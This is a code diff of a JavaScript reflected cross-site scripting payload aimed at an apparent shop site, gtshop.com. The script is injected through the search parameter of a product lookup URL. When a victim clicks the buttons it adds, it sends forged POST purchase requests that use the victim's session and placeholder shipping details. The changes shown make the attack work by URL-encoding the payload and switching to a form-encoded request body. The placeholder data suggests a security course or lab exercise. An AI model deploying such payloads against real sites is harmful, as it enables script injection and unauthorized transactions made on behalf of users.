@@ -25,22 +25,17 @@
 				newDiv.style.right="20px";
 				newDiv.onclick = function(event) {
 					var Http = new XMLHttpRequest();
-					var formData = new FormData();
 					var href = document.getElementById(index).parentNode.firstChild.href;
 					var product_id = (href.split('='))[1];
 					var cols = document.getElementById(index).parentNode.parentNode.querySelectorAll('td');
 					var name = cols[1].innerHTML;
 					var price = cols[3].innerHTML;
-					formData.append("address","lol");
-					formData.append("mail","lol@lol.com");
-					formData.append("phone","12345");
-					formData.append("price",price);
-					formData.append("product_id", product_id);
-					formData.append("product_name",name);
-					formData.append("ship_date","2011-01-01");
+					console.log("&");
+					var params = 'mail=lol@lol.com&' + 'address=lol&' + 'ship_date=2011-01-01&' + 'phone=1234567&' + 'price=$' + price + '&product_id=' + product_id +   '&product_name=' + name;
 					var url = 'http://www.gtshop.com/products/buy';
 					Http.open('POST',url);
-					Http.send(formData);
+					Http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+					Http.send(params);
 					var dis = document.getElementById(index);
 					dis.style.pointerEvents = 'none';
 				};
@@ -51,7 +46,7 @@
 	})
 
 	`
-	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + script + '<\/script>'
+	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + encodeURIComponent(script) + '<\/script>'
 	window.location.href = url
 	return false
 
